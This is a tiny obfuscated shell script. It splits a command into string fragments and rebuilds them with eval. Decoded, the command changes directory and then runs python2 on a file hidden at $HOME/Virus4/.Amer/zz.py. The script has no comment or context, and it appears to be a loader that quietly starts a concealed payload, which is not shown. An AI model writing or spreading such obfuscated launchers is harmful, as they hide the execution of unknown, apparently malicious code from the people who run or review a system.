z="
";Ez='E/Vi';Dz='$HOM';Iz='z.py';Cz='on2 ';Gz='/.Am';Hz='er/z';Bz='pyth';Az='cd';Fz='rus4';
eval "$Az$z$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz"